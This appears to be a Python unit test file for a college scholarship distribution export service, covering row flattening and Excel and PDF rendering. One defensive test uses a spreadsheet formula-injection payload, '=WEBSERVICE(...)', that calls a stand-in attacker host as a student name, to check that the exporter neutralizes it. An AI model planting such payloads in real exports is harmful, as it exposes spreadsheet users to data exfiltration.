"""Unit tests for the college distribution-results export renderer.

Sync tests -> unit lane. Pure rendering: no DB, no HTTP.
"""

import io

from openpyxl import load_workbook

from app.services.college_distribution_export_service import (
    HEADERS,
    CollegeDistributionExportService,
    DistributionExportRow,
    flatten_sub_types,
)


def _sub_types():
    return [
        {
            "code": "nstc",
            "label": "國科會",
            "label_en": "NSTC",
            "admitted": [
                {
                    "student_number": "310460031",
                    "student_name": "王小明",
                    "department": "電子研",
                    "rank_position": 1,
                    "applied_sub_types": ["國科會", "教育部"],
                },
            ],
            "backup": [
                {
                    "student_number": "310460033",
                    "student_name": "張三",
                    "department": "電子研",
                    "backup_position": 1,
                    "rank_position": 3,
                },
            ],
            "rejected": [
                {"student_number": "310460034", "student_name": "李四", "department": "資工研", "rank_position": 5},
            ],
        }
    ]


class TestFlatten:
    def test_flatten_orders_admitted_then_pooled_rejected(self):
        """Mirrors the panel: 正取 blocks first, then backup+rejected pooled as 未錄取."""
        rows = flatten_sub_types(_sub_types())
        assert [r.outcome for r in rows] == ["正取", "未錄取", "未錄取"]

    def test_flatten_positions_are_college_rank_for_every_bucket(self):
        """備取 folds into 未錄取 and carries its rank_position, not backup_position."""
        rows = flatten_sub_types(_sub_types())
        assert [r.position for r in rows] == [1, 3, 5]

    def test_flatten_pooled_rejected_sorted_by_rank_across_groups(self):
        sub_types = [
            {
                "code": "moe",
                "label": "教育部",
                "admitted": [],
                "backup": [],
                "rejected": [{"student_number": "R2", "student_name": "乙", "department": "", "rank_position": 7}],
            },
            {
                "code": "nstc",
                "label": "國科會",
                "admitted": [],
                "backup": [],
                "rejected": [{"student_number": "R1", "student_name": "甲", "department": "", "rank_position": 2}],
            },
        ]
        rows = flatten_sub_types(sub_types)
        assert [r.student_number for r in rows] == ["R1", "R2"]

    def test_flatten_uses_the_sub_type_label_for_admitted_rows(self):
        rows = flatten_sub_types(_sub_types())
        assert rows[0].sub_type_label == "國科會"

    def test_flatten_rejected_rows_drop_the_meaningless_group_label(self):
        """Rejected students arrive under their RANKING's sub-type code (e.g. a
        literal "default") — the export must not surface that as 類別."""
        rows = flatten_sub_types(_sub_types())
        assert all(r.sub_type_label == "—" for r in rows if r.outcome == "未錄取")

    def test_flatten_joins_applied_sub_types(self):
        rows = flatten_sub_types(_sub_types())
        assert rows[0].applied_scholarships == "國科會、教育部"

    def test_flatten_missing_applied_sub_types_renders_empty_string(self):
        rows = flatten_sub_types(_sub_types())
        assert rows[2].applied_scholarships == ""

    def test_flatten_empty_sub_types_yields_no_rows(self):
        assert flatten_sub_types([]) == []


class TestBuildWorkbook:
    def _load(self, payload: bytes):
        return load_workbook(io.BytesIO(payload)).active

    def test_header_row_matches_the_shared_column_model(self):
        svc = CollegeDistributionExportService()
        payload = svc.build_workbook(rows=flatten_sub_types(_sub_types()), title="T", sheet_name="S")
        ws = self._load(payload)
        assert [c.value for c in ws[2]] == HEADERS

    def test_data_rows_render_expected_values(self):
        svc = CollegeDistributionExportService()
        payload = svc.build_workbook(rows=flatten_sub_types(_sub_types()), title="T", sheet_name="S")
        ws = self._load(payload)
        assert [c.value for c in ws[3]] == ["國科會", "正取", 1, "310460031", "王小明", "電子研", "國科會、教育部"]

    def test_missing_position_renders_an_empty_cell_not_the_string_none(self):
        """A None 名次 must never render the literal string "None".

        _row_cells maps None -> "", and openpyxl normalizes an empty string to an
        empty cell (readback value is None, NOT ""). Both are correct; the bug this
        guards against is the cell reading "None".
        """
        rows = [DistributionExportRow("國科會", "未錄取", None, "X1", "無名次", "電子研", "")]
        svc = CollegeDistributionExportService()
        ws = self._load(svc.build_workbook(rows=rows, title="T", sheet_name="S"))
        value = ws.cell(row=3, column=3).value
        assert value is None, f"expected an empty cell, got {value!r}"

    def test_zero_rows_still_emits_the_header(self):
        svc = CollegeDistributionExportService()
        ws = self._load(svc.build_workbook(rows=[], title="T", sheet_name="S"))
        assert [c.value for c in ws[2]] == HEADERS

    def test_malicious_student_name_is_neutralized(self):
        """SECURITY: openpyxl writes a leading '=' as a LIVE formula and 姓名 comes
        from SIS. Mirrors test_college_ranking_export_service.test_malicious_student_name_is_neutralized.
        """
        payload = '=WEBSERVICE("https://attacker.example/x")'
        rows = [DistributionExportRow("國科會", "正取", 1, "X1", payload, "電子研", "")]
        svc = CollegeDistributionExportService()
        ws = self._load(svc.build_workbook(rows=rows, title="T", sheet_name="S"))
        value = ws.cell(row=3, column=5).value
        assert not str(value).startswith("="), f"formula injection not neutralized: {value!r}"


class TestBuildPdf:
    def test_returns_a_pdf(self):
        svc = CollegeDistributionExportService()
        payload = svc.build_pdf(rows=flatten_sub_types(_sub_types()), title="114學年度測試分發結果")
        assert payload.startswith(b"%PDF")

    def test_zero_rows_does_not_raise(self):
        svc = CollegeDistributionExportService()
        assert svc.build_pdf(rows=[], title="空").startswith(b"%PDF")

    def test_xml_special_chars_in_name_do_not_break_rendering(self):
        rows = [DistributionExportRow("國科會", "正取", 1, "X1", "A & B <C>", "電子研", "")]
        svc = CollegeDistributionExportService()
        assert svc.build_pdf(rows=rows, title="T").startswith(b"%PDF")
